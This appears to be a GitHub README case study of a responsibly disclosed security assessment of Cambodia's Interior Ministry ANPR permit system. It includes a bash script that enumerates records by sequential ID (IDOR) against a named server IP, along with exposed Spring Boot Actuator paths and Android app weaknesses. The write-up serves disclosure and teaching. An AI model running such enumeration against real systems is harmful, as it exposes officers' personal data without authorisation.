<div align="center">

# 🛡️ Full-Stack Security Assessment: Government ANPR Entry/Exit System (EES)
### Ministry of Interior — Cambodia

[![Target](https://img.shields.io/badge/Target-EES_ANPR_System-blue?style=for-the-badge&logo=globe)](https://ees.interior.gov.kh/client)
[![Web](https://img.shields.io/badge/Surface-Web_API-orange?style=for-the-badge&logo=springboot)]()
[![Mobile](https://img.shields.io/badge/Surface-Android_App-green?style=for-the-badge&logo=android)]()
[![Severity](https://img.shields.io/badge/Severity-Critical_7.5%2F10-red?style=for-the-badge)]()
[![Status](https://img.shields.io/badge/Status-Patched_%26_Verified-success?style=for-the-badge&logo=checkmarx)]()
[![Disclosure](https://img.shields.io/badge/Disclosure-Responsible-blueviolet?style=for-the-badge)]()

</div>

---

## 📋 Executive Summary

This case study documents a full-stack security assessment of Cambodia's government **Automatic Number Plate Recognition (ANPR)** system — covering both its **backend web API** and its **companion Android application**. The assessment identified critical vulnerabilities across both attack surfaces, including unauthenticated API access exposing law enforcement personnel data, a publicly accessible Spring Boot Actuator, and multiple mobile security weaknesses linking back to the same backend infrastructure.

> All findings were responsibly disclosed to the MOI IT team. The system was fully patched within **24 hours** of initial report. Patch verified **April 7, 2026**.

---

## 🎯 Assessment Scope

| Surface       | Target                                      | Method              |
|---------------|---------------------------------------------|---------------------|
| Web API       | `http://175.100.74.227:1234/api/v1/`        | Black-box, non-intrusive |
| Web Frontend  | `https://ees.interior.gov.kh/client`        | Passive recon       |
| Android App   | `com.example.gov_reg` (v0.1.0)              | Static analysis (MobSF v4.5.0) |

---

## 🗺️ Attack Surface Overview

```
┌─────────────────────────────────────────────────────────────┐
│                     EES ANPR SYSTEM                         │
│                                                             │
│   [Android App]              [Web Frontend]                 │
│   com.example.gov_reg   →    ees.interior.gov.kh/client     │
│          │                          │                       │
│          └───────────┬──────────────┘                       │
│                      ▼                                      │
│          [Spring Boot API  :1234]                           │
│           /api/v1/bureaus/{id}                              │
│           /api/v1/anpr/{id}                                 │
│           /actuator/env                                     │
│           /actuator/mappings                                │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔴 Web API Findings

### Phase 1 — Reconnaissance

Passive fingerprinting revealed:
- **Spring Boot** via `X-Application-Context` response header
- **Nginx** as reverse proxy (exposed in `Server:` header)
- API versioned under `/api/v1/` namespace on port `1234`
- No authentication headers required on initial probe

### Phase 2 — Endpoint Fuzzing

Mapped the full `/api/v1/` namespace using [Bubble-Scanner](https://github.com/MoriartyPuth/bubble-scanner), a custom automation utility built for high-velocity JSON parsing and IDOR validation.

**Key Features:**
- Recursive crawler across 100+ Bureau/Department hierarchies via integer incrementation
- Regex extractor targeting Khmer script identifiers and plate number formats
- Sequence generator for predictable `GDDTM` request string brute-forcing

### Phase 3 — Vulnerability Discovery

#### Insecure Direct Object Reference (IDOR)

ANPR records and organizational units were indexed with sequential integers. No authentication was required.

```bash
#!/bin/bash
# Bureau hierarchy enumeration via IDOR (pre-patch)
TARGET="http://175.100.74.227:1234/api/v1/bureaus"
for id in {1..100}; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$id")
  if [ "$status" == "200" ]; then
    name=$(curl -s "$TARGET/$id" | jq -r '.name')
    echo "[+] Found Bureau $id: $name"
  fi
done
```

Confirmed exposure of sensitive units including the **Cybercrime Unit (ID 23)** and **Police Biography Office (ID 33)**.

**Anonymized data sample (pre-patch):**
```json
{
  "id": 17754,
  "requestId": "GDDTM20260406PR2312",
  "ownerName": "REDACTED_OFFICER_NAME",
  "plateNumber": "2A-XXXX",
  "bureauId": 33,
  "status": "APPROVED"
}
```

#### Predictable Resource Naming

Request IDs followed the strict pattern `GDDTM[YYYYMMDD]PR[Sequence]`, enabling time-series enumeration of all parking permit activity across the Ministry.

#### Spring Boot Actuator Exposed

The `/actuator` directory was publicly accessible, leaking:
- `/actuator/env` — environment variables (potential credential exposure)
- `/actuator/mappings` — full internal route map
- `/actuator/heapdump` — JVM heap dump

---

## 🟠 Mobile Application Findings

**App:** `com.example.gov_reg` (Flutter/Dart, v0.1.0, minSdk 24)
**Tool:** MobSF v4.5.0 Static Analysis
**Risk Score:** 42/100 — Grade B (Medium Risk)

### HIGH Severity

| Finding | Detail |
|--------|---------|
| Debug Certificate | App signed with debug keystore — not production-ready |
| Cleartext Traffic Enabled | `android:usesCleartextTraffic="true"` — unencrypted HTTP permitted |
| Low minSdk (API 24) | Exposes app to older Android vulnerabilities |

### MEDIUM / WARNING

| CWE | Finding |
|-----|---------|
| CWE-312 | Hardcoded secrets in source — potential API keys/credentials |
| CWE-330 | Insecure random number generation |
| CWE-276 | Insecure external storage permissions |

### 🔗 Cross-Surface Risk (Web + Mobile)

> The Android app connects to the same backend API (`ees.interior.gov.kh`) that served unauthenticated IDOR endpoints. With `usesCleartextTraffic=true`, device-to-API traffic could be intercepted in plaintext over local networks — compounding the IDOR exposure. A compromised device on the same network as a Ministry officer could passively capture permit data without any active exploitation of the API.

---

## 🔧 Remediation & Patch Verification

### Web API (Applied by MOI IT Team)

| Vector | Fix Applied |
|--------|-------------|
| IDOR on `/api/v1/**` | Auth-wall: `authenticated()` enforced on all sub-paths |
| Actuator exposure | Nginx configured to return `405` on all `/actuator` paths |
| Search enumeration | Controller updated to return `[]` regardless of query |
| Bureau/Position endpoints | Final endpoint lockdown applied |

### Mobile (Recommended)

| Finding | Recommendation |
|--------|----------------|
| Debug certificate | Re-sign with production keystore before release |
| Cleartext traffic | Set `usesCleartextTraffic="false"`, enforce TLS/HTTPS |
| CWE-312 | Move secrets to environment variables or Android Keystore |
| CWE-330 | Replace with `SecureRandom` for all crypto operations |
| CWE-276 | Restrict file storage to internal app directory |

---

## 🎖️ Outcome

| Metric | Result |
|--------|--------|
| Report submitted | April 6, 2026 |
| System lockdown | Within 24 hours |
| Patch verified | April 7, 2026 |
| Disclosure type | Responsible — coordinated with MOI IT |
| Data leaked | 0 records post-patch |

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| [Bubble-Scanner](https://github.com/MoriartyPuth/bubble-scanner) | Custom IDOR crawler & JSON parser |
| MobSF v4.5.0 | Android static analysis |
| curl + jq | Manual API probing |
| Nginx headers | Server fingerprinting |

---

> **Disclaimer:** This assessment was conducted under responsible disclosure principles for educational and security-hardening purposes. No data was exfiltrated or retained. All findings were reported directly to the system owner prior to publication.

---

## 👤 Author

<div align="center">

**Eav Puthcambo**
<br/>
AUPP Cybersecurity Programme
<br/>
American University of Phnom Penh

[![GitHub](https://img.shields.io/badge/GitHub-MoriartyPuth--Labs-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MoriartyPuth-Labs)

</div>
